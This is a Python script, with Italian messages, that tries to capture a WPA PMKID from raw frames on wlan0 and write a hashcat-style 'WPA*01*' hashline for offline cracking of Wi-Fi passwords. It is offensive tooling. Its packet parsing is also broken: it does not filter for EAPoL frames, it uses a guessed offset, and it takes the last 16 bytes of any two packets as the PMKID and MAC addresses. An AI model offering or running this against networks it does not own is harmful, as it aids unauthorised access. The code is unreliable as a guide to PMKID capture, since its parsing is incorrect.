#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Capture PMKID from EAPoL frames.
Saves hashline to hashline.txt and logs details.
"""

import socket
import sys
import os
import signal
from datetime import datetime

LOG_FILE = "wifi_pen.log"

def log_message(msg):
    with open(LOG_FILE, "a") as f:
        f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {msg}\n")

def main():
    log_message("=== CAPTURE PMKID START ===")
    interface = "wlan0"
    essid = None
    try:
        with open("/storage/.config/system/configs/system.cfg", 'r') as f:
            for line in f:
                if line.startswith("wifi.ssid="):
                    essid = line.split("=", 1)[1].strip()
                    break
    except:
        pass
    if not essid:
        essid = "UNKNOWN_SSID"
        log_message("SSID not found in config, using default")

    frame_num = 0
    rawSocket = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
    rawSocket.bind((interface, 0x0003))

    first_eapol = None
    pmkid = None
    mac_ap = None
    mac_cl = None

    def handle_timeout(a, b):
        raise TimeoutError

    signal.signal(signal.SIGALRM, handle_timeout)
    signal.alarm(60)  # timeout 60 secondi

    try:
        while True:
            packet = rawSocket.recvfrom(2048)[0]
            frame_body = packet
            offset = 2  # offset tipico
            eapol = frame_body[offset:]
            frame_num += 1

            if frame_num == 1:
                first_eapol = eapol
                pmkid = eapol[-16:].hex()
                mac_ap = eapol[4:10]
                log_message(f"First EAPoL frame captured, PMKID: {pmkid}")
            elif frame_num == 2:
                mac_cl = eapol[4:10]
                log_message(f"Second EAPoL frame captured, MAC Client: {mac_cl.hex()}")
                hashline = f"WPA*01*{pmkid}*{mac_ap.hex()}*{mac_cl.hex()}*{essid.encode('utf-8').hex()}***"
                log_message("Hashline generated")
                with open("hashline.txt", "w") as f:
                    f.write(hashline)
                log_message("Hashline saved to hashline.txt")
                print("\n✅ PMKID catturato!")
                print(f"PMKID: {pmkid}")
                print(f"SSID: {essid}")
                print(f"MAC AP: {mac_ap.hex()}")
                print(f"MAC Client: {mac_cl.hex()}")
                print(f"Hashline: {hashline}")
                break
    except TimeoutError:
        log_message("Capture timed out")
        print("\n⏰ Timeout: nessun frame ricevuto in 60 secondi.")
        print("Verifica che il router supporti PMKID e che la rete sia attiva.")
    except Exception as e:
        log_message(f"Exception: {e}")
        print(f"\nErrore: {e}")
    finally:
        signal.alarm(0)
        rawSocket.close()
        log_message("=== CAPTURE PMKID END ===")

if __name__ == "__main__":
    main()